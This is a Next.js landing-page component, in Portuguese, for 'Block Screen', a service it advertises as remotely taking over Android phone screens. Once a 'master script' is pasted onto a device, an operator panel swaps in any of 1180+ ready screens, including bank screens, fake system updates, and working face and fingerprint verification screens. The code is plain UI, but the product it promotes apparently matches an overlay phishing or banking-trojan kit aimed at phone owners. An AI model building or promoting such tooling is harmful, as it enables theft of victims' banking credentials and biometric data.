import Link from 'next/link'
import { MonitorPlay, Zap, Smartphone, ShieldCheck, LayoutGrid, ArrowRight, Lock } from 'lucide-react'

export default function Home() {
  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* Nav */}
      <header className="sticky top-0 z-20 border-b border-border/50 bg-background/80 backdrop-blur">
        <div className="mx-auto flex h-16 max-w-6xl items-center justify-between px-6">
          <div className="flex items-center gap-2.5">
            <div className="flex h-9 w-9 items-center justify-center rounded-lg bg-primary/20 drop-shadow-[0_0_20px_rgba(168,85,247,0.35)]">
              <MonitorPlay className="h-5 w-5 text-primary" />
            </div>
            <span className="text-lg font-extrabold tracking-tight bg-gradient-to-r from-fuchsia-400 to-violet-400 bg-clip-text text-transparent">
              Block Screen
            </span>
          </div>
          <nav className="flex items-center gap-3">
            <Link href="/login" className="hidden sm:inline-flex h-9 items-center rounded-md border border-input bg-background px-4 text-sm shadow-sm hover:bg-accent transition-colors">
              Entrar
            </Link>
            <Link href="/login" className="inline-flex h-9 items-center rounded-md bg-primary px-4 text-sm font-medium text-primary-foreground shadow hover:bg-primary/90 transition-colors">
              Acessar painel
            </Link>
          </nav>
        </div>
      </header>

      {/* Hero */}
      <section className="relative overflow-hidden">
        <div className="pointer-events-none absolute inset-0 bg-[radial-gradient(60%_50%_at_50%_0%,rgba(139,92,246,0.15),transparent)]" />
        <div className="mx-auto max-w-6xl px-6 py-20 sm:py-28 text-center">
          <span className="inline-flex items-center gap-2 rounded-full border border-primary/30 bg-primary/10 px-3 py-1 text-xs font-medium text-primary">
            <Zap className="h-3.5 w-3.5" /> Controle remoto de telas em tempo real
          </span>
          <h1 className="mx-auto mt-6 max-w-3xl text-4xl font-bold tracking-tight sm:text-6xl">
            Assuma a tela de qualquer <span className="bg-gradient-to-r from-fuchsia-400 to-violet-400 bg-clip-text text-transparent">celular Android</span>
          </h1>
          <p className="mx-auto mt-5 max-w-2xl text-muted-foreground sm:text-lg">
            Block Screen troca a tela de um dispositivo Android à distância — verificação facial, atualização de sistema, bancos e muito mais. Um script, controle total pelo painel.
          </p>
          <div className="mt-8 flex items-center justify-center gap-3">
            <Link href="/login" className="inline-flex h-11 items-center rounded-md bg-primary px-6 text-sm font-semibold text-primary-foreground shadow hover:bg-primary/90 transition-colors">
              Acessar o painel <ArrowRight className="ml-2 h-4 w-4" />
            </Link>
          </div>
        </div>
      </section>

      {/* Como funciona */}
      <section className="mx-auto max-w-6xl px-6 pb-20">
        <div className="grid gap-4 sm:grid-cols-3">
          {[
            { icon: Smartphone, t: '1. Cole o script', d: 'Adicione o código mestre uma única vez no dispositivo Android.' },
            { icon: LayoutGrid, t: '2. Escolha a tela', d: 'Mais de 1180 modelos prontos, organizados por categoria no painel.' },
            { icon: Zap, t: '3. Ative na hora', d: 'A tela do celular muda em tempo real — sem tocar no aparelho.' },
          ].map((s) => (
            <div key={s.t} className="rounded-xl border border-border/50 bg-gradient-to-br from-card to-card/40 p-6">
              <div className="mb-3 flex h-10 w-10 items-center justify-center rounded-lg bg-primary/20">
                <s.icon className="h-5 w-5 text-primary" />
              </div>
              <h3 className="font-semibold">{s.t}</h3>
              <p className="mt-1 text-sm text-muted-foreground">{s.d}</p>
            </div>
          ))}
        </div>
      </section>

      {/* Recursos */}
      <section className="mx-auto max-w-6xl px-6 pb-24">
        <h2 className="text-center text-2xl font-bold tracking-tight">Tudo que você precisa</h2>
        <div className="mt-8 grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
          {[
            { icon: LayoutGrid, t: '1180+ telas prontas', d: 'Catálogo completo por categoria, com busca e organização.' },
            { icon: Zap, t: 'Tempo real', d: 'Ativação instantânea via polling leve — sem reinstalar nada.' },
            { icon: ShieldCheck, t: 'Câmera e biometria', d: 'Telas de verificação facial e digital totalmente funcionais.' },
            { icon: Lock, t: 'Painel protegido', d: 'Acesso com senha. Só você controla as telas.' },
          ].map((f) => (
            <div key={f.t} className="rounded-xl border border-border/50 bg-card/40 p-5">
              <f.icon className="h-5 w-5 text-primary" />
              <h3 className="mt-3 text-sm font-semibold">{f.t}</h3>
              <p className="mt-1 text-xs text-muted-foreground">{f.d}</p>
            </div>
          ))}
        </div>
      </section>

      <footer className="border-t border-border/50 py-8 text-center text-xs text-muted-foreground">
        Block Screen — controle remoto de telas Android
      </footer>
    </div>
  )
}
